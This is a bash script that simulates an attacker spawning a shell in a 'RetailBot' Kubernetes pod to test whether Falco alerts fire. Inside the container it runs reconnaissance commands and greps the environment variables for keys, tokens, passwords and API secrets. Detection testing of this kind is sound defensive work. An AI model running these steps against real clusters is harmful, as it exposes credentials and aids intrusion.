#!/bin/bash
# Simulates an attacker who has gained kubectl access and spawns a shell
# inside the RetailBot AI pod.
#
# MITRE ATT&CK: Execution > T1059 - Command and Scripting Interpreter
#
# Expected Falco alerts:
#   - Spawned Shell in Container
#   - Terminal shell in container
#
# Run this on the VM (or from local with microk8s kubectl configured):
#   chmod +x attack.sh && ./attack.sh

NS="retailbot"
APP="retailbot"

echo "============================================="
echo " RetailBot Shell Spawn Attack Simulation"
echo " MITRE ATT&CK T1059 — Command Interpreter"
echo "============================================="
echo ""

# Find the target pod
POD=$(microk8s kubectl get pod -n $NS -l app=$APP -o jsonpath='{.items[0].metadata.name}')

if [ -z "$POD" ]; then
  echo "[ERROR] No running pod found for app=$APP in namespace $NS"
  exit 1
fi

echo "[*] Target pod : $POD"
echo "[*] Namespace  : $NS"
echo "[*] Spawning shell inside container..."
echo "---------------------------------------------"

microk8s kubectl exec -n $NS "$POD" -- /bin/sh -c '
  echo "[+] Shell spawned inside RetailBot container"
  echo ""
  echo "[*] Identity"
  echo "    hostname : $(hostname)"
  echo "    whoami   : $(whoami)"
  echo "    uid      : $(id)"
  echo ""
  echo "[*] Process tree"
  ps aux 2>/dev/null | head -20
  echo ""
  echo "[*] Network interfaces"
  ip addr 2>/dev/null || ifconfig 2>/dev/null
  echo ""
  echo "[*] Environment variables (looking for secrets)"
  env | grep -iE "key|token|secret|password|api|ngc|pg" 2>/dev/null
  echo ""
  echo "[+] Attack simulation complete — check Falco/Sysdig for alerts"
'

echo "---------------------------------------------"
echo "[*] Done. Expected Falco rules fired:"
echo "    - Spawned Shell in Container"
echo "    - Terminal shell in container"
